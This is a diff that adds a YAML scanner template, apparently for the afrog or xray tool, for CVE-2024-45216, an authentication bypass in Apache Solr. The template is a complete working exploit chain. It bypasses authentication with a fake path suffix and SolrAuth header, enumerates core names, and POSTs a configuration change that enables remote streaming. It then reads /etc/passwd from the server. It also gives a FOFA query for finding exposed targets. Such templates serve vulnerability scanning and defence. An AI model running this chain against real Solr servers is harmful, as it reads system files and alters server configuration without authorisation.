@@ -1,0 +1,67 @@
+id: solr-bypass-fileread
+
+info:
+  name: Apache-Solr 身份认证绕过导致任意文件读取
+  author: zan8in
+  severity: high
+  verified: true
+  description: |-
+    Apache Solr 身份认证绕过漏洞(CVE-2024-45216)，该漏洞存在于Apache Solr的PKIAuthenticationPlugin中，该插件在启用Solr身份验证时默认启用。攻击者可以利用在任何Solr API URL路径末尾添加假结尾的方式，绕过身份验证访问任意路由，从而获取敏感数据或进行其他恶意操作。
+    fofa: app="APACHE-Solr"
+  effected: |-
+    5.3.0 <= Apache Solr < 8.11.4
+    9.0.0 <= Apache Solr < 9.7.0
+  references:
+    - https://github.com/wy876/POC/blob/a9e4000fc76d0157b53ade916323b7b8256b17c3/Apache/Apache-Solr%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0(CVE-2024-45216).md
+  tags: cve,cve2024,solr,apache,fileread
+
+set:
+  randstr: randomLowercase(10)
+rules:
+  # r0:
+  #   request:
+  #     method: GET
+  #     path: /solr/admin/info/properties
+  #   expression: response.status == 401
+  # r1:
+  #   request:
+  #     method: GET
+  #     path: /solr/admin/info/properties:/admin/info/key
+  #     headers:
+  #       SolrAuth: "{{randstr}}"
+  #   expression: |
+  #     response.status == 200 &&
+  #     response.body.bcontains(b'"responseHeader":') &&
+  #     response.body.bcontains(b'"status":') &&
+  #     response.body.bcontains(b'"QTime":') &&
+  #     response.body.bcontains(b'"system.properties":')
+  r0:
+    request:
+      method: GET
+      path: /solr/admin/cores:/admin/info/key?indexInfo=false&wt=json
+    expression: response.status == 200 && response.body.bcontains(b'"responseHeader":') && response.body.bcontains(b'"status":0') && response.body.bcontains(b'"QTime":0') && response.body.bcontains(b'"initFailures":')
+    output:
+      search: '"\"name\":\"(?P<corename>.+)\",".bsubmatch(response.body)'
+      corename: search["corename"]
+  r1:
+    request:
+      method: POST
+      path: /solr/{{corename}}/config:/admin/info/key
+      headers:
+        Content-Type: application/json
+        SolrAuth: "{{randstr}}"
+      body: '{"set-property":{"requestDispatcher.requestParsers.enableRemoteStreaming":true}}'
+    expression: response.status == 200 && response.body.bcontains(b'"responseHeader":') && response.body.bcontains(b'"status":0') && response.body.bcontains(b'"QTime":')
+  r2:
+    request:
+      method: GET
+      path: /solr/{{corename}}/debug/dump:/admin/info/key?param=ContentStreams&stream.url=file:///etc/passwd
+      headers:
+        SolrAuth: "{{randstr}}"
+    expression: |
+      response.status == 200 && 
+      response.body.bcontains(b'"responseHeader":') &&
+      response.body.bcontains(b'"status":') &&
+      response.body.bcontains(b'"QTime":') &&
+      "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+expression: r0() && r1() && r2()
